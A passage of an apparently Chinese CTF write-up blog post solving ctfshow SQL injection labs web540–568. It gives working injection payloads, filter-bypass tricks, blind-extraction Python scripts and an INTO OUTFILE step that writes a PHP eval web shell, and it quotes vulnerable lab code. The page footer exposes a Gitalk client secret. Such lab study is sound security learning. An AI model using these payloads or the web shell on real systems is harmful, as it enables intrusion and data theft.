+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
+</code></pre>
+<h2 id="web540">web540</h2>
+<p>后台源码:<br>
+pass_change.php</p>
+<pre><code class="language-php">&lt;?php
+# Validating the user input........
+	$username= $_SESSION[&quot;username&quot;];
+	$curr_pass= mysql_real_escape_string($_POST['current_password']);
+	$pass= mysql_real_escape_string($_POST['password']);
+	$re_pass= mysql_real_escape_string($_POST['re_password']);
+	
+	if($pass==$re_pass)
+	{	
+		$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;;
+		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
+		$row = mysql_affected_rows();
+		echo '&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;';
+		echo '&lt;center&gt;';
+		if($row==1)
+		{
+			echo &quot;Password successfully updated&quot;;
+	
+		}
+		else
+		{
+			header('Location: failed.php');
+			//echo 'You tried to be smart, Try harder!!!! :( ';
+		}
+	}
+</code></pre>
+<p>可以看到只有<code>$_SESSION[&quot;username&quot;]</code>没有被过滤，我们注册账号可以控制值，二次注入。</p>
+<p>使用时间盲注，编写脚本（copy from Y4）</p>
+<pre><code class="language-py">import requests
+session = requests.session()
+
+result = ''
+i = 0
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1),0)'
+        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)'
+        payload = f'if(ascii(substr((select/**/group_concat(flag4)from(ctfshow.flag)),{i},1))&gt;{mid},sleep(0.6),0)'
+        username = f&quot;admin' and {payload} or '1'='1&quot;
+        url1 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/login_create.php'
+        data = {
+            'username': username,
+            'password': '1',
+            're_password': '1',
+            'submit': 'Register'
+        }
+        r = session.post(url1, data=data)
+        url2 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/login.php'
+        data = {
+            'login_user': username,
+            'login_password': '1',
+            'mysubmit': 'Login',
+        }
+        r = session.post(url2, data=data)
+        url3 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/pass_change.php'
+        data = {
+            'current_password': '1',
+            'password': '2',
+            're_password': '2',
+            'submit': 'Reset'
+        }
+
+        try:
+            r = session.post(url3,data=data,timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web541">web541</h2>
+<p>过滤了<code>or</code>和<code>and</code><br>
+使用重写绕过</p>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(schema_name)%20from%20infoorrmation_schema.schemata)),1)--+
+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(table_name)%20from%20infoorrmation_schema.tables where table_schema=&quot;ctfshow&quot;)),1)--+
+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(column_name)%20from%20infoorrmation_schema.columns where table_schema=&quot;ctfshow&quot;)),1)--+
+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20flag4s%20from%20ctfshow.flags)),1)--+
+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20right(flag4s,20)%20from%20ctfshow.flags)),1)--+
+</code></pre>
+<h2 id="web542">web542</h2>
+<p>不能使用报错注入，但是有回显，使用union注入。<br>
+还是同样的双写绕过过滤。</p>
+<pre><code>-1%20union%20select%201,2,group_concat(table_name)%20from%20infoorrmation_schema.tables where table_schema='ctfshow'%23
+</code></pre>
+<pre><code>-1%20union%20select%201,2,group_concat(column_name)%20from%20infoorrmation_schema.columns where table_schema='ctfshow'%23
+</code></pre>
+<pre><code>-1%20union%20select%201,2,group_concat(flag4s)%20from%20ctfshow.flags%23
+</code></pre>
+<h2 id="web543">web543</h2>
+<p>过滤了空格和注释符</p>
+<p>绕过空格方式：</p>
+<pre><code>%09 TAB 键（水平）
+%0a 新建一行
+%0c 新的一页
+%0d return 功能
+%0b TAB 键（垂直）
+%a0 空格
+</code></pre>
+<p>这里用括号的方式，和<code>||</code>代替or来绕过。</p>
+<p>注释符都被过滤掉了，最后的引号我们需要闭合。</p>
+<pre><code>999%27||updatexml(1,concat(0x7e,(select((flag4s))from(ctfshow.flags)),0x7e),1)||%27
+</code></pre>
+<pre><code>999%27||updatexml(1,concat(0x7e,(select(right(flag4s,20))from(ctfshow.flags)),0x7e),1)||%27
+</code></pre>
+<h2 id="web544">web544</h2>
+<p><code>')</code>闭合<br>
+没有报错信息<br>
+使用上题方法，改为布尔盲注。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://6ec46794-6350-449e-8a3b-361aac041abf.challenge.ctf.show/&quot;
+
+result = ''
+i = 0
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        # payload = f'if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        payload = f'if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),{i},1))&gt;{mid},1,0)'
+        data = {
+            'id': f&quot;999')||{payload}||('0&quot;
+        }
+        r = requests.get(url,params=data)
+        if &quot;Dumb&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web545">web545</h2>
+<p>过滤了select,union,空格</p>
+<pre><code class="language-php">&lt;?php
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);		//strip out /*
+$id= preg_replace('/[--]/',&quot;&quot;, $id);		//Strip out --.
+$id= preg_replace('/[#]/',&quot;&quot;, $id);			//Strip out #.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace('/select/m',&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace('/union/s',&quot;&quot;, $id);	    //Strip out union
+$id= preg_replace('/select/s',&quot;&quot;, $id);	    //Strip out select
+$id= preg_replace('/UNION/s',&quot;&quot;, $id);	    //Strip out UNION
+$id= preg_replace('/SELECT/s',&quot;&quot;, $id);	    //Strip out SELECT
+$id= preg_replace('/Union/s',&quot;&quot;, $id);	    //Strip out Union
+$id= preg_replace('/Select/s',&quot;&quot;, $id);	    //Strip out select
+return $id;
+}
+</code></pre>
+<p>过滤了许多，但还是可以用重写的方式来绕过<br>
+因为select过滤了两次，需要多套一层。</p>
+<p>报错注入</p>
+<pre><code>%27and%0aupdatexml(1,concat(0x3d,(seselselectectlect%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata)),1)and%27
+</code></pre>
+<p>直接使用union注入也行</p>
+<pre><code>999%27%0auunionnion%0aseseselectlectlect%0a1,(seleseselectlectct%0aflag4s%0afrom%0actfshow.flags),%273
+</code></pre>
+<h2 id="web546">web546</h2>
+<p>同上题，<code>&quot;</code>闭合</p>
+<pre><code>999&quot;%0auunionnion%0aseseselectlectlect%0a1,(seleseselectlectct%0aflag4s%0afrom%0actfshow.flags),&quot;3
+</code></pre>
+<h2 id="web547">web547</h2>
+<p><code>')</code>闭合，更改了过滤规则。</p>
+<pre><code class="language-php">&lt;?php
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);				//strip out /*
+$id= preg_replace('/[--]/',&quot;&quot;, $id);				//Strip out --.
+$id= preg_replace('/[#]/',&quot;&quot;, $id);					//Strip out #.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    		//Strip out spaces.
+//$id= preg_replace('/select/m',&quot;&quot;, $id);	   		 	//Strip out spaces.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    		//Strip out spaces.
+$id= preg_replace('/union\s+select/i',&quot;&quot;, $id);	    //Strip out UNION &amp; SELECT.
+return $id;
+}
+</code></pre>
+<p>过滤了union\s+select，同样使用重写的方式。</p>
+<pre><code>999%27)%0aunion%0aunion%0aselectselect%0a1,(select%0aflag4s%0afrom%0actfshow.flags),(%273
+</code></pre>
+<h2 id="web548">web548</h2>
+<p>同上</p>
+<h2 id="web549">web549</h2>
+<p>提示有waf<br>
+分析下代码</p>
+<pre><code class="language-php">&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+//disable error reporting
+error_reporting(0);
+
+// take the variables 
+if(isset($_GET['id']))
+{
+	$qs = $_SERVER['QUERY_STRING'];
+	$hint=$qs;
+	$id1=java_implimentation($qs);
+	$id=$_GET['id'];
+	//echo $id1;
+	whitelist($id1);
+	
+	//logging the connection parameters to a file for analysis.
+	$fp=fopen('result.txt','a');
+	fwrite($fp,'ID:'.$id.&quot;\n&quot;);
+	fclose($fp);
+// connectivity 
+	$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+	$result=mysql_query($sql);
+	$row = mysql_fetch_array($result);
+	if($row)
+	{
+	  	echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;;	
+	  	echo 'Your Login name:'. $row['username'];
+	  	echo &quot;&lt;br&gt;&quot;;
+	  	echo 'Your Password:' .$row['password'];
+	  	echo &quot;&lt;/font&gt;&quot;;
+  	}
+	else 
+	{
+		echo '&lt;font color= &quot;#FFFF00&quot;&gt;';
+		print_r(mysql_error());
+		echo &quot;&lt;/font&gt;&quot;;  
+	}
+}
+	else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+//WAF implimentation with a whitelist approach..... only allows input to be Numeric.
+function whitelist($input)
+{
+	$match = preg_match(&quot;/^\d+$/&quot;, $input);
+	if($match)
+	{
+		//echo &quot;you are good&quot;;
+		//return $match;
+	}
+	else
+	{	
+		header('Location: hacked.php');
+		//echo &quot;you are bad&quot;;
+	}
+}
+
+// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
+function java_implimentation($query_string)
+{
+	$q_s = $query_string;
+	$qs_array= explode(&quot;&amp;&quot;,$q_s);
+
+
+	foreach($qs_array as $key =&gt; $value)
+	{
+		$val=substr($value,0,2);
+		if($val==&quot;id&quot;)
+		{
+			$id_value=substr($value,3,30); 
+			return $id_value;
+			echo &quot;&lt;br&gt;&quot;;
+			break;
+		}
+
+	}
+
+}
+</code></pre>
+<p>发现会对id1进行检查，必须为数字，这里没法绕过，但是传入sql语句的是id，这里id1是获取第一个为id的参数，但是<code>$_GET['id']</code>，会获取最后一个id参数的值。</p>
+<pre><code>?id=1&amp;id=-1%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web550">web550</h2>
+<p>同上，<code>&quot;</code>闭合</p>
+<pre><code>?id=1&amp;id=-1&quot;%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web551">web551</h2>
+<p>同上，<code>&quot;)</code>闭合</p>
+<pre><code>?id=1&amp;id=-1&quot;)%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web552">web552</h2>
+<p>绕过转义函数addslashes<br>
+宽字节注入。</p>
+<p>mysql有一个特性就是在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p>
+<pre><code>%df%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web553">web553</h2>
+<p>同上</p>
+<h2 id="web554">web554</h2>
+<p>也是宽字节注入</p>
+<pre><code>uname=%df%27%20union%20select%201,(select%20flag4s%20from%20ctfshow.flags)--+&amp;passwd=&amp;submit=Submit
+</code></pre>
+<h2 id="web555">web555</h2>
+<p>这里没有引号，不需要绕过addslashes，直接注入就行。</p>
+<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web556">web556</h2>
+<p>这里改用了mysql_real_escape_string函数</p>
+<p>但是需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。才可以完美的防御</p>
+<p>同样使用宽字节注入</p>
+<pre><code>%df%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web557">web557</h2>
+<pre><code>uname=%df%27%20union%20select%201,(select%20flag4s%20from%20ctfshow.flags)--+&amp;passwd=123&amp;submit=Submit
+</code></pre>
+<h2 id="web558">web558</h2>
+<p>用了mysqli_multi_query函数，可以使用堆叠注入，但是union注入也可以。</p>
+<pre><code>-1%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web559">web559</h2>
+<p>同上</p>
+<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web560">web560</h2>
+<p>同上</p>
+<pre><code>-1%27)union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web561">web561</h2>
+<p>同上</p>
+<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web562">web562</h2>
+<p>username处做了过滤，在passwd处注入。</p>
+<pre><code>login_user=123&amp;login_password=-1%20%27union%20select%201,(select%20flag4s%20from%20ctfshow.flags),3--+&amp;mysubmit=Login
+</code></pre>
+<h2 id="web563">web563</h2>
+<p>同上，<code>')</code>闭合</p>
+<pre><code>login_user=132&amp;login_password=-1%20%27)union%20select%201,(select%20flag4s%20from%20ctfshow.flags),3--+&amp;mysubmit=Login
+</code></pre>
+<h2 id="web564">web564</h2>
+<p>order by类型注入</p>
+<p>报错注入</p>
+<pre><code>?sort=updatexml(0,(select%20flag4s%20from%20ctfshow.flags),1)
+</code></pre>
+<pre><code>?sort=updatexml(0,(select%20right(flag4s,20)%20from%20ctfshow.flags),1)
+</code></pre>
+<h2 id="web565">web565</h2>
+<p>同上，<code>'</code>闭合</p>
+<pre><code>?sort=%27%20and%20updatexml(0,(select%20flag4s%20from%20ctfshow.flags),1)--+
+</code></pre>
+<pre><code>?sort=%27%20and%20updatexml(0,(select%20right(flag4s,20)%20from%20ctfshow.flags),1)--+
+</code></pre>
+<h2 id="web566">web566</h2>
+<p>同上，但没有报错输出了<br>
+使用盲注的方式</p>
+<p>这里还能用into outfile写shell的方式。</p>
+<pre><code>?sort=1 into outfile &quot;/var/www/html/1.php&quot;lines terminated by 0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020--+
+</code></pre>
+<p>写php脚本来查询</p>
+<pre><code class="language-php">&lt;?php
+$q=@mysql_query(&quot;select flag4s from ctfshow.flags&quot;);while($rs=@mysql_fetch_row($q)){echo(&quot; (&quot;.$rs[0].&quot;)&quot;);}
+</code></pre>
+<h2 id="web567">web567</h2>
+<p>同上</p>
+<h2 id="web568">web568</h2>
+<p>同上，<code>'</code>闭合</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://blog.csdn.net/solitudi/article/details/115534124</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/cicsn-2023-web-writeup/">
+                  <h3 class="post-title">
+                    CICSN 2023 - Web - Writeup
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
